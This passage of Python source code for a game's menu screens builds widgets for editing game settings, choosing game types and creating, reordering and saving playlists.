            background=False)

        # so selection loops through everything and doesn't get stuck in
        # sub-containers
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=c, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        v = scrollHeight - 5
        h = -40

        # keep track of all the selectable widgets we make so we can wire
        # them up conveniently
        widgetColumn = []

        # map select button
        t = bs.textWidget(
            parent=self._subContainer, position=(h + 49, v - 63),
            size=(100, 30),
            maxWidth=110, text=bs.Lstr(resource='mapText'),
            hAlign="left", color=(0.8, 0.8, 0.8, 1.0),
            vAlign="center")

        b = bs.imageWidget(
            parent=self._subContainer, size=(256 * 0.7, 125 * 0.7),
            position=(h + 261 - 128 + 128.0 * 0.56, v - 90),
            texture=mapTex, modelOpaque=bs.getModel('levelSelectButtonOpaque'),
            modelTransparent=bs.getModel('levelSelectButtonTransparent'),
            maskTexture=bs.getTexture('mapPreviewMask'))
        mapButton = b = bs.buttonWidget(
            parent=self._subContainer, size=(140, 60),
            position=(h + 448, v - 72),
            onActivateCall=bs.Call(self._selectMap),
            scale=0.7, label=bs.Lstr(resource='mapSelectText'))
        widgetColumn.append([b])

        mapNameText = bs.textWidget(
            parent=self._subContainer, position=(h + 363 - 123, v - 114),
            size=(100, 30),
            flatness=1.0, shadow=1.0, scale=0.55, maxWidth=256 * 0.7 * 0.8,
            text=bsMap.getMapDisplayString(self._map),
            hAlign="center", color=(0.6, 1.0, 0.6, 1.0),
            vAlign="center")
        v -= mapHeight

        for settingName, setting in self._settingsDefs:
            value = setting['default']
            valueType = type(value)

            # now if there's an existing value for it in the config,
            # override with that
            try:
                value = valueType(config['settings'][settingName])
            except Exception:
                pass

            # shove the starting value in there to start..
            self._settings[settingName] = value

            nameTranslated = self._getLocalizedSettingName(settingName)

            mw1 = 280
            mw2 = 70

            # handle types with choices specially:
            if 'choices' in setting:

                for choice in setting['choices']:
                    if len(choice) != 2:
                        raise Exception(
                            "Expected 2-member tuples for 'choices'; got: " +
                            repr(choice))
                    if type(choice[0]) not in (str, unicode):
                        raise Exception(
                            "First value for choice tuple must be a str; got: "
                            +repr(choice))
                    if type(choice[1]) is not valueType:
                        raise Exception(
                            "Choice type does not match default value; choice:"
                            +repr(choice)+"; setting:"+repr(setting))
                if valueType not in (int, float):
                    raise Exception(
                        "Choice type setting must have int or float default; "
                        "got: "+repr(setting))

                # start at the choice corresponding to the default if possible
                self._choiceSelections[settingName] = 0
                found = False
                for index, choice in enumerate(setting['choices']):
                    if choice[1] == value:
                        self._choiceSelections[settingName] = index
                        break

                v -= spacing
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 50, v),
                    size=(100, 30),
                    maxWidth=mw1, text=nameTranslated, hAlign="left",
                    color=(0.8, 0.8, 0.8, 1.0),
                    vAlign="center")
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 509 - 95, v),
                    size=(0, 28),
                    text=self._getLocalizedSettingName(
                        setting['choices']
                        [self._choiceSelections[settingName]][0]),
                    editable=False, color=(0.6, 1.0, 0.6, 1.0),
                    maxWidth=mw2, hAlign="right", vAlign="center", padding=2)
                b1 = bs.buttonWidget(
                    parent=self._subContainer, position=(h + 509 - 50 - 1, v),
                    size=(28, 28),
                    label="<", autoSelect=True, onActivateCall=bs.Call(
                        self._choiceInc, settingName, t, setting, -1),
                    repeat=True)
                b2 = bs.buttonWidget(
                    parent=self._subContainer, position=(h + 509 + 5, v),
                    size=(28, 28),
                    label=">", autoSelect=True, onActivateCall=bs.Call(
                        self._choiceInc, settingName, t, setting, 1),
                    repeat=True)
                widgetColumn.append([b1, b2])

            elif valueType in [int, float]:
                v -= spacing
                try:
                    minValue = setting['minValue']
                except Exception:
                    minValue = 0
                try:
                    maxValue = setting['maxValue']
                except Exception:
                    maxValue = 9999
                try:
                    increment = setting['increment']
                except Exception:
                    increment = 1
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 50, v),
                    size=(100, 30),
                    text=nameTranslated, hAlign="left",
                    color=(0.8, 0.8, 0.8, 1.0),
                    vAlign="center", maxWidth=mw1)
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 509 - 95, v),
                    size=(0, 28),
                    text=str(value),
                    editable=False, color=(0.6, 1.0, 0.6, 1.0),
                    maxWidth=mw2, hAlign="right", vAlign="center", padding=2)
                b1 = bs.buttonWidget(parent=self._subContainer,
                                     position=(h + 509 - 50 - 1, v),
                                     size=(28, 28),
                                     label="-", autoSelect=True,
                                     onActivateCall=bs.Call(
                                         self._inc, t, minValue, maxValue, -
                                         increment, valueType, settingName),
                                     repeat=True)
                b2 = bs.buttonWidget(parent=self._subContainer,
                                     position=(h + 509 + 5, v),
                                     size=(28, 28),
                                     label="+", autoSelect=True,
                                     onActivateCall=bs.Call(
                                         self._inc, t, minValue, maxValue,
                                         increment, valueType, settingName),
                                     repeat=True)
                widgetColumn.append([b1, b2])

            elif valueType == bool:
                v -= spacing
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 50, v),
                    size=(100, 30),
                    text=nameTranslated, hAlign="left",
                    color=(0.8, 0.8, 0.8, 1.0),
                    vAlign="center", maxWidth=mw1)
                t = bs.textWidget(
                    parent=self._subContainer, position=(h + 509 - 95, v),
                    size=(0, 28),
                    text=bs.Lstr(resource='onText')
                    if value else bs.Lstr(resource='offText'), editable=False,
                    color=(0.6, 1.0, 0.6, 1.0),
                    maxWidth=mw2, hAlign="right", vAlign="center", padding=2)
                c = bs.checkBoxWidget(
                    parent=self._subContainer, text='',
                    position=(h + 505 - 50 - 5, v - 2),
                    size=(200, 30),
                    autoSelect=True, textColor=(0.8, 0.8, 0.8),
                    value=value, onValueChangeCall=bs.Call(
                        self._checkValueChange, settingName, t))
                widgetColumn.append([c])

            else:
                raise Exception()

        # ok now wire up the column
        try:
            prevWidgets = None
            for c in widgetColumn:
                if prevWidgets is not None:
                    # wire our rightmost to their rightmost
                    bs.widget(edit=prevWidgets[-1], downWidget=c[-1])
                    bs.widget(c[-1], upWidget=prevWidgets[-1])
                    # wire our leftmost to their leftmost
                    bs.widget(edit=prevWidgets[0], downWidget=c[0])
                    bs.widget(c[0], upWidget=prevWidgets[0])
                prevWidgets = c
        except Exception:
            bs.printException(
                'error wiring up game-settings-select widget column')

        bs.buttonWidget(edit=addButton, onActivateCall=bs.Call(self._add))
        bs.containerWidget(
            edit=self._rootWidget, selectedChild=addButton,
            startButton=addButton)

        if defaultSelection == 'map':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=self._scrollWidget)
            bs.containerWidget(edit=self._subContainer, selectedChild=mapButton)

    def _getLocalizedSettingName(self, name):
        return bs.Lstr(translate=('settingNames', name))

    def _selectMap(self):
        # replace ourself with the map-select UI
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = SelectMapWindow(
            self._gameClass, self._sessionType, copy.deepcopy(
                self._getConfig()),
            self._editInfo, self._completionCall).getRootWidget()

    def _choiceInc(self, settingName, widget, setting, increment):
        choices = setting['choices']
        if increment > 0:
            self._choiceSelections[settingName] = min(
                len(choices)-1, self._choiceSelections[settingName]+1)
        else:
            self._choiceSelections[settingName] = max(
                0, self._choiceSelections[settingName]-1)
        bs.textWidget(edit=widget, text=self._getLocalizedSettingName(
            choices[self._choiceSelections[settingName]][0]))
        self._settings[settingName] = choices[self._choiceSelections
                                              [settingName]][1]

    def _cancel(self):
        self._completionCall(None)

    def _checkValueChange(self, settingName, widget, value):
        bs.textWidget(edit=widget, text=bs.Lstr(resource='onText')
                      if value else bs.Lstr(resource='offText'))
        self._settings[settingName] = value

    def _getConfig(self):
        settings = copy.deepcopy(self._settings)
        settings['map'] = self._map
        return {'settings': settings}

    def _add(self):
        self._completionCall(copy.deepcopy(self._getConfig()))

    def _inc(self, ctrl, minVal, maxVal, increment, settingType, settingName):
        if settingType == float:
            val = float(bs.textWidget(query=ctrl))
        else:
            val = int(bs.textWidget(query=ctrl))
        val += increment
        val = max(minVal, min(val, maxVal))
        if settingType == float:
            bs.textWidget(edit=ctrl, text=str(round(val, 2)))
        elif settingType == int:
            bs.textWidget(edit=ctrl, text=str(int(val)))
        else:
            raise Exception('invalid vartype: '+str(vartype))
        self._settings[settingName] = val


class AddGameWindow(Window):

    def __init__(self, editSession, transition='inRight'):
        self._editSession = editSession
        self._r = 'addGameWindow'
        self._width = 750 if gSmallUI else 650
        xInset = 50 if gSmallUI else 0
        self._height = 346 if gSmallUI else 380 if gMedUI else 440
        topExtra = 30 if gSmallUI else 20

        self._scrollWidth = 210

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, scale=2.17
            if gSmallUI else 1.5 if gMedUI else 1.0, stackOffset=(0, 1)
            if gSmallUI else(0, 0))

        self._backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(58 + xInset, self._height - 53),
            size=(165, 70),
            scale=0.75, textScale=1.2, label=bs.Lstr(resource='backText'),
            autoSelect=True, buttonType='back', onActivateCall=self._back)
        self._selectButton = selectButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(self._width - (172 + xInset),
                      self._height - 50),
            autoSelect=True, size=(160, 60),
            scale=0.75, textScale=1.2, label=bs.Lstr(resource='selectText'),
            onActivateCall=self._add)

        if gToolbars:
            bs.widget(
                edit=selectButton, rightWidget=bsInternal._getSpecialWidget(
                    'partyButton'))

        bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 28),
            size=(0, 0),
            scale=1.0, text=bs.Lstr(resource=self._r + '.titleText'),
            hAlign='center', color=gTitleColor, maxWidth=250, vAlign='center')
        v = self._height - 64

        self._selectedTitleText = bs.textWidget(
            parent=self._rootWidget,
            position=(xInset + self._scrollWidth + 50 + 30, v - 15),
            size=(0, 0),
            scale=1.0, color=(0.7, 1.0, 0.7, 1.0),
            maxWidth=self._width - self._scrollWidth - 150 - xInset * 2,
            hAlign='left', vAlign='center')
        v -= 30

        self._selectedDescriptionText = bs.textWidget(
            parent=self._rootWidget,
            position=(xInset + self._scrollWidth + 50 + 30, v),
            size=(0, 0),
            scale=0.7, color=(0.5, 0.8, 0.5, 1.0),
            maxWidth=self._width - self._scrollWidth - 150 - xInset * 2,
            hAlign='left')

        scrollHeight = self._height-100

        v = self._height - 60

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(xInset + 61, v - scrollHeight),
            size=(self._scrollWidth, scrollHeight),
            highlight=False)
        bs.widget(edit=self._scrollWidget, upWidget=self._backButton,
                  leftWidget=self._backButton, rightWidget=selectButton)
        self._column = None

        v -= 35
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=self._backButton,
            startButton=selectButton)
        self._selectedGameType = None

        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)

        self._refresh()

    def _refresh(self, selectGetMoreGamesButton=False):

        if self._column is not None:
            self._column.delete()

        self._column = bs.columnWidget(parent=self._scrollWidget)
        gameTypes = [gt for gt in bsUtils.getGameTypes()
                     if gt.supportsSessionType(
                         self._editSession._sessionType)]

        # sort in the current language
        gameTypes.sort(key=lambda g: g.getDisplayString().evaluate())

        for i, gameType in enumerate(gameTypes):
            t = bs.textWidget(
                parent=self._column, position=(0, 0),
                size=(self._width - 88, 24),
                text=gameType.getDisplayString(),
                hAlign="left", vAlign="center", color=(0.8, 0.8, 0.8, 1.0),
                maxWidth=self._scrollWidth * 0.8, onSelectCall=bs.Call(
                    self._setSelectedGameType, gameType),
                alwaysHighlight=True, selectable=True, onActivateCall=bs.Call(
                    bs.realTimer, 100, self._selectButton.activate))
            if i == 0:
                bs.widget(edit=t, upWidget=self._backButton)

        self._getMoreGamesButton = bs.buttonWidget(
            parent=self._column, autoSelect=True, label=bs.Lstr(
                resource=self._r + '.getMoreGamesText'),
            color=(0.54, 0.52, 0.67),
            textColor=(0.7, 0.65, 0.7),
            onActivateCall=self._onGetMoreGamesPress, size=(178, 50))
        if selectGetMoreGamesButton:
            bs.containerWidget(
                edit=self._column, selectedChild=self._getMoreGamesButton,
                visibleChild=self._getMoreGamesButton)

    def _onGetMoreGamesPress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        StoreWindow(modal=True, showTab='minigames',
                    onCloseCall=self._onStoreClose,
                    originWidget=self._getMoreGamesButton)

    def _onStoreClose(self):
        self._refresh(selectGetMoreGamesButton=True)

    def _add(self):
        bsInternal._lockAllInput()  # make sure no more commands happen
        bs.realTimer(100, bsInternal._unlockAllInput)
        self._editSession._addGameTypeSelected(self._selectedGameType)

    def _setSelectedGameType(self, gameType):
        self._selectedGameType = gameType
        bs.textWidget(edit=self._selectedTitleText,
                      text=gameType.getDisplayString())
        bs.textWidget(edit=self._selectedDescriptionText,
                      text=gameType.getDescriptionDisplayString(
                          self._editSession.getSessionType()))

    def _back(self):
        self._editSession._addGameCancelled()


class EditPlaylistWindow(Window):

    def __init__(self, editSession, transition='inRight'):

        self._editSession = editSession

        self._r = 'editGameListWindow'

        try:
            prevSelection = self._editSession._editUISelection
        except Exception:
            prevSelection = None

        self._width = 770 if gSmallUI else 670
        xInset = 50 if gSmallUI else 0
        self._height = 400 if gSmallUI else 470 if gMedUI else 540
        spacing = 40
        buttonWidth = 350

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, scale=2.0
            if gSmallUI else 1.3 if gMedUI else 1.0, stackOffset=(0, -16)
            if gSmallUI else(0, 0))

        cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(35 + xInset, self._height - 60),
            scale=0.8, size=(175, 60),
            autoSelect=True, label=bs.Lstr(resource='cancelText'),
            textScale=1.2)
        saveButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(self._width - (195 + xInset),
                      self._height - 60),
            scale=0.8, size=(190, 60),
            autoSelect=True, leftWidget=cancelButton, label=bs.Lstr(
                resource='saveText'),
            textScale=1.2)

        if gToolbars:
            bs.widget(edit=b, rightWidget=bsInternal._getSpecialWidget(
                'partyButton'))

        bs.widget(edit=cancelButton, leftWidget=cancelButton,
                  rightWidget=saveButton)

        t = bs.textWidget(parent=self._rootWidget,
                          position=(-10, self._height - 50),
                          size=(self._width, 25),
                          text=bs.Lstr(resource=self._r + '.titleText'),
                          color=gTitleColor, scale=1.05, hAlign="center",
                          vAlign="center", maxWidth=270)

        v = self._height - 115

        self._scrollWidth = self._width-(205+2*xInset)

        bs.textWidget(
            parent=self._rootWidget, text=bs.Lstr(
                resource=self._r + '.listNameText'),
            position=(196 + xInset, v + 31),
            maxWidth=150, color=(0.8, 0.8, 0.8, 0.5),
            size=(0, 0),
            scale=0.75, hAlign='right', vAlign='center')

        self._textField = bs.textWidget(
            parent=self._rootWidget, position=(210 + xInset, v + 7),
            size=(self._scrollWidth - 53, 43),
            text=self._editSession._name, hAlign="left", vAlign="center",
            maxChars=40, autoSelect=True, color=(0.9, 0.9, 0.9, 1.0),
            description=bs.Lstr(resource=self._r + '.listNameText'),
            editable=True, padding=4, onReturnPressCall=self.
            _savePressWithSound)
        bs.widget(edit=cancelButton, downWidget=self._textField)

        self._listWidgets = []

        h = 40+xInset
        v = self._height - 172
        hspacing = 17

        bColor = (0.6, 0.53, 0.63)
        bTextColor = (0.75, 0.7, 0.8)

        v -= 2
        v += 63

        s = 1.03 if gSmallUI else 1.36 if gMedUI else 1.74
        v -= 63.0*s

        addGameButton = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(110, 61.0 * s),
            onActivateCall=self._add, onSelectCall=bs.Call(
                self._setUISelection, 'addButton'),
            autoSelect=True, buttonType='square', color=bColor,
            textColor=bTextColor, textScale=0.8, label=bs.Lstr(
                resource=self._r + '.addGameText'))
        bs.widget(edit=addGameButton, upWidget=self._textField)
        v -= 63.0*s

        self._editButton = editGameButton = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(110, 61.0 * s),
            onActivateCall=self._edit, onSelectCall=bs.Call(
                self._setUISelection, 'editButton'),
            autoSelect=True, buttonType='square', color=bColor,
            textColor=bTextColor, textScale=0.8, label=bs.Lstr(
                resource=self._r + '.editGameText'))
        v -= 63.0*s

        removeGameButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(110, 61.0 * s),
            textScale=0.8, onActivateCall=self._remove, autoSelect=True,
            buttonType='square', color=bColor, textColor=bTextColor,
            label=bs.Lstr(resource=self._r + '.removeGameText'))
        v -= 40
        h += 9
        moveUpButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(42, 35),
            onActivateCall=self._moveUp, label=bs.getSpecialChar('upArrow'),
            buttonType='square', color=bColor, textColor=bTextColor,
            autoSelect=True, repeat=True)
        h += 52
        moveDownButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(42, 35),
            onActivateCall=self._moveDown, autoSelect=True, buttonType='square',
            color=bColor, textColor=bTextColor, label=bs.getSpecialChar(
                'downArrow'),
            repeat=True)

        v = self._height - 100
        scrollHeight = self._height - 155
        scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, position=(160 + xInset, v - scrollHeight),
            highlight=False, onSelectCall=bs.Call(
                self._setUISelection, 'gameList'),
            size=(self._scrollWidth, (scrollHeight - 15)))
        bs.widget(
            edit=scrollWidget, leftWidget=addGameButton,
            rightWidget=scrollWidget)
        self._columnWidget = bs.columnWidget(parent=scrollWidget)
        bs.widget(edit=self._columnWidget, upWidget=self._textField)

        for button in [addGameButton, editGameButton, removeGameButton]:
            bs.widget(edit=button, leftWidget=button, rightWidget=scrollWidget)

        self._refresh()

        bs.buttonWidget(edit=cancelButton, onActivateCall=self._cancel)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=cancelButton,
            selectedChild=scrollWidget)

        bs.buttonWidget(edit=saveButton, onActivateCall=self._savePress)
        bs.containerWidget(edit=self._rootWidget, startButton=saveButton)

        if prevSelection == 'addButton':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=addGameButton)
        elif prevSelection == 'editButton':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=editGameButton)
        elif prevSelection == 'gameList':
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=scrollWidget)

    def _setUISelection(self, selection):
        self._editSession._editUISelection = selection

    def _cancel(self):
        bs.playSound(bs.getSound('powerdown01'))
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = PlaylistWindow(
            transition='inLeft', sessionType=self._editSession._sessionType,
            selectPlaylist=self._editSession._existingPlaylist).getRootWidget()

    def _add(self):
        # store list name then tell the session to perform an add
        self._editSession._name = bs.textWidget(query=self._textField)
        self._editSession._addGamePressed()

    def _edit(self):
        # store list name then tell the session to perform an add
        self._editSession._name = bs.textWidget(query=self._textField)
        self._editSession._editGamePressed()

    def _savePress(self):
        newName = bs.textWidget(query=self._textField)
        if (newName != self._editSession._existingPlaylist and newName
                in bs.getConfig()[self._editSession._configName+' Playlists']):
            bs.screenMessage(
                bs.Lstr(resource=self._r+'.cantSaveAlreadyExistsText'))
            bs.playSound(bs.getSound('error'))
            return
        if len(newName) == 0:
            bs.playSound(bs.getSound('error'))
            return
        if len(self._editSession._playlist) == 0:
            bs.screenMessage(bs.Lstr(resource=self._r+'.cantSaveEmptyListText'))
            bs.playSound(bs.getSound('error'))
            return
        if newName == self._editSession._defaultListName:
            bs.screenMessage(
                bs.Lstr(resource=self._r+'.cantOverwriteDefaultText'))
            bs.playSound(bs.getSound('error'))
            return

        # if we had an old one, delete it
        if self._editSession._existingPlaylist is not None:
            bsInternal._addTransaction(
                {'type': 'REMOVE_PLAYLIST',
                 'playlistType': self._editSession._configName,
                 'playlistName': self._editSession._existingPlaylist})

        bsInternal._addTransaction(
            {'type': 'ADD_PLAYLIST',
             'playlistType': self._editSession._configName,
             'playlistName': newName, 'playlist': copy.deepcopy(
                 self._editSession._playlist)})
        bsInternal._runTransactions()

        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        bs.playSound(bs.getSound('gunCocking'))
        uiGlobals['mainMenuWindow'] = PlaylistWindow(
            transition='inLeft', sessionType=self._editSession._sessionType,
            selectPlaylist=newName).getRootWidget()

    def _savePressWithSound(self):
        bs.playSound(bs.getSound('swish'))
        self._savePress()

    def _select(self, index):
        self._editSession._selectedIndex = index

    def _refresh(self):

        # need to grab this here as rebuilding the list will change it otherwise
        oldSelectionIndex = self._editSession._selectedIndex

        while len(self._listWidgets) > 0:
            self._listWidgets.pop().delete()
        for index, p in enumerate(self._editSession._playlist):

            try:
                desc = bsUtils.resolveTypeName(
                    p['type']).getConfigDisplayString(p)
            except Exception:
                bs.printException()
                desc = "(invalid: '"+p['type']+"')"

            w = bs.textWidget(
                parent=self._columnWidget, size=(self._width - 80, 30),
                onSelectCall=bs.Call(self._select, index),
                alwaysHighlight=True, color=(0.8, 0.8, 0.8, 1.0),
                padding=0, maxWidth=self._scrollWidth * 0.93, text=desc,
                onActivateCall=self._editButton.activate, vAlign='center',
                selectable=True)
            bs.widget(edit=w, showBufferTop=50, showBufferBottom=50)
            # wanna be able to jump up to the text field from the top one
            if index == 0:
                bs.widget(edit=w, upWidget=self._textField)
            self._listWidgets.append(w)
            if oldSelectionIndex == index:
                bs.columnWidget(edit=self._columnWidget,
                                selectedChild=w, visibleChild=w)

    def _moveDown(self):
        if self._editSession._selectedIndex >= len(
                self._editSession._playlist) - 1:
            return
        i = self._editSession._selectedIndex
        tmp = self._editSession._playlist[i]
        self._editSession._playlist[i] = self._editSession._playlist[i+1]
        self._editSession._playlist[i+1] = tmp
        self._editSession._selectedIndex += 1
        self._refresh()

    def _moveUp(self):
        if self._editSession._selectedIndex < 1:
            return
        i = self._editSession._selectedIndex
        tmp = self._editSession._playlist[i]
        self._editSession._playlist[i] = self._editSession._playlist[i-1]
        self._editSession._playlist[i-1] = tmp
        self._editSession._selectedIndex -= 1
        self._refresh()

    def _remove(self):
        if len(self._editSession._playlist) == 0:
            return
        del self._editSession._playlist[self._editSession._selectedIndex]
        if self._editSession._selectedIndex >= len(self._editSession._playlist):
            self._editSession._selectedIndex = len(
                self._editSession._playlist) - 1
        bs.playSound(bs.getSound('shieldDown'))
        self._refresh()


def _setupPlaylistTypeVars(obj, sessionType):

    if issubclass(sessionType, bs.TeamsSession):

        playModeName = bs.Lstr(
            resource='playModes.teamsText', fallbackResource='teamsText')
        obj._getDefaultListCall = bsUtils._getDefaultTeamsPlaylist
        obj._sessionTypeName = 'bs.TeamsSession'
        obj._configName = 'Team Tournament'
        obj._windowTitleName = bs.Lstr(
            resource='playModes.teamsText', fallbackResource='teamsText')
        obj._sessionType = bs.TeamsSession

    elif issubclass(sessionType, bs.FreeForAllSession):

        playModeName = bs.Lstr(
            resource='playModes.freeForAllText',
            fallbackResource='freeForAllText')
        obj._getDefaultListCall = bsUtils._getDefaultFreeForAllPlaylist
        obj._sessionTypeName = 'bs.FreeForAllSession'
        obj._configName = 'Free-for-All'
        obj._windowTitleName = bs.Lstr(
            resource='playModes.freeForAllText',
            fallbackResource='freeForAllText')
        obj._sessionType = bs.FreeForAllSession
    else:
        raise Exception('invalid session type: '+sessionType)

    obj._defaultListName = bs.Lstr(resource='defaultGameListNameText', subs=[
                                   ('${PLAYMODE}', playModeName)])
    obj._defaultNewListName = bs.Lstr(
        resource='defaultNewGameListNameText',
        subs=[('${PLAYMODE}', playModeName)])


class GameListEditSession(object):

    def __init__(
            self, sessionType, existingPlaylist=None, transition='inRight',
            playlist=None, playlistName=None):

        bsConfig = bs.getConfig()

        # since we may be showing our map list momentarily,
        # lets go ahead and preload all map preview textures
        bsMap.preloadPreviewMedia()
        self._sessionType = sessionType
        _setupPlaylistTypeVars(self, sessionType)
        self._existingPlaylist = existingPlaylist

        self._configNameFull = self._configName+' Playlists'

        # make sure config exists
        if self._configNameFull not in bsConfig:
            bsConfig[self._configNameFull] = {}

        self._selectedIndex = 0
        if existingPlaylist:
            self._name = existingPlaylist
            # filter out invalid games
            self._playlist = bsUtils._filterPlaylist(
                bsConfig[self._configName + ' Playlists'][existingPlaylist],
                sessionType=sessionType, removeUnOwned=False)
        else:
            if playlist is not None:
                self._playlist = playlist
            else:
                self._playlist = []
            if playlistName is not None:
                self._name = playlistName
            else:
                # find a good unused name
                i = 1
                while True:
                    self._name = (self._defaultNewListName.evaluate()
                                  +((' '+str(i)) if i > 1 else ''))
                    if self._name not in bsConfig[self._configName +
                                                  ' Playlists']:
                        break
                    i += 1
            # also we want it to come up with 'add' highlighted since its empty
            # and thats all they can do
            self._editUISelection = 'addButton'

        uiGlobals['mainMenuWindow'] = EditPlaylistWindow(
            editSession=self, transition=transition).getRootWidget()

    def getSessionType(self):
        return self._sessionType

    def _addGamePressed(self):
        bs.containerWidget(
            edit=uiGlobals['mainMenuWindow'],
            transition='outLeft')
        uiGlobals['mainMenuWindow'] = AddGameWindow(
            editSession=self).getRootWidget()

    def _editGamePressed(self):
        if len(self._playlist) == 0:
            return
        self._showEditUI(
            gameType=bsUtils.resolveTypeName(
                self._playlist[self._selectedIndex]['type']),
            config=self._playlist[self._selectedIndex])

    def _addGameCancelled(self):
        bs.containerWidget(
            edit=uiGlobals['mainMenuWindow'],
            transition='outRight')
        uiGlobals['mainMenuWindow'] = EditPlaylistWindow(
            editSession=self, transition='inLeft').getRootWidget()

    def _showEditUI(self, gameType, config):
        self._editingGame = (config is not None)
        self._editingGameType = gameType
        gameType.createConfigUI(
            self._sessionType, copy.deepcopy(config),
            self._editGameDone)

    def _addGameTypeSelected(self, gameType):
        self._showEditUI(gameType=gameType, config=None)

    def _editGameDone(self, config):
        if config is None:
            # if we were editing, go back to our list
            if self._editingGame:
                bs.playSound(bs.getSound('powerdown01'))
                bs.containerWidget(
                    edit=uiGlobals['mainMenuWindow'],
                    transition='outRight')
                uiGlobals['mainMenuWindow'] = EditPlaylistWindow(
                    editSession=self, transition='inLeft').getRootWidget()
            # otherwise we were adding; go back to the add type choice list
            else:
                bs.containerWidget(
                    edit=uiGlobals['mainMenuWindow'],
                    transition='outRight')
                uiGlobals['mainMenuWindow'] = AddGameWindow(
                    editSession=self, transition='inLeft').getRootWidget()
        else:
            # make sure type is in there..
            config['type'] = bsUtils.getTypeName(self._editingGameType)

            if self._editingGame:
                self._playlist[self._selectedIndex] = copy.deepcopy(config)
            else:
                # add a new entry to the playlist..
                insertIndex = min(len(self._playlist), self._selectedIndex+1)
                self._playlist.insert(insertIndex, copy.deepcopy(config))
                self._selectedIndex = insertIndex

            bs.playSound(bs.getSound('gunCocking'))
            bs.containerWidget(
                edit=uiGlobals['mainMenuWindow'],
                transition='outRight')
            uiGlobals['mainMenuWindow'] = EditPlaylistWindow(
                editSession=self, transition='inLeft').getRootWidget()


def standardGameConfigUI(gameClass, sessionType, config, completionCall):
    # replace the main window once we come up successfully
    prevWindow = uiGlobals['mainMenuWindow']
    uiGlobals['mainMenuWindow'] = GameSettingsSelectWindow(
        gameClass, sessionType, config,
        completionCall=completionCall).getRootWidget()
    bs.containerWidget(edit=prevWindow, transition='outLeft')


class PlaylistWindow(Window):

    def __init__(
            self, sessionType, transition='inRight', selectPlaylist=None,
            originWidget=None):

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        global gMainWindow

        self._sessionType = sessionType
        _setupPlaylistTypeVars(self, sessionType)

        self._maxPlaylists = 30

        self._r = 'gameListWindow'

        self._width = 750 if gSmallUI else 650
        xInset = 50 if gSmallUI else 0
        self._height = 380 if gSmallUI else 420 if gMedUI else 500
        spacing = 40
        buttonWidth = 350
        topExtra = 20 if gSmallUI else 0

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            scale=2.05 if gSmallUI else 1.5 if gMedUI else 1.0,
            stackOffset=(0, -10) if gSmallUI else(0, 0))

        self._backButton = backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(43 + xInset, self._height - 60),
            size=(160, 68),
            scale=0.77, autoSelect=True, textScale=1.3, label=bs.Lstr(
                resource='backText'),
            buttonType='back')

        t = bs.textWidget(
            parent=self._rootWidget, position=(0, self._height - 47),
            size=(self._width, 25),
            text=bs.Lstr(
                resource=self._r + '.titleText',
                subs=[('${TYPE}', self._windowTitleName)]),
            color=gHeadingColor, maxWidth=290, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(edit=b, buttonType='backSmall', size=(60, 60),
                            label=bs.getSpecialChar('back'))

        v = self._height - 59
        h = 41+xInset
        hspacing = 15
        bColor = (0.6, 0.53, 0.63)
        bTextColor = (0.75, 0.7, 0.8)

        self._lockImages = []
        lockTex = bs.getTexture('lock')

        s = 1.1 if gSmallUI else 1.27 if gMedUI else 1.57
        s *= 0.63
        v -= 65.0*s
        newButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(90, 58.0 * s),
            onActivateCall=self._newPlaylist, color=bColor, autoSelect=True,
            buttonType='square', textColor=bTextColor, textScale=0.7,
            label=bs.Lstr(
                resource='newText', fallbackResource=self._r + '.newText'))
        self._lockImages.append(bs.imageWidget(parent=self._rootWidget,
                                               size=(30, 30),
                                               drawController=b,
                                               position=(h-10, v+58.0*s - 28),
                                               texture=lockTex))

        v -= 65.0*s
        self._editButton = editButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(h, v),
            size=(90, 58.0 * s),
            onActivateCall=self._editPlaylist, color=bColor, autoSelect=True,
            textColor=bTextColor, buttonType='square', textScale=0.7,
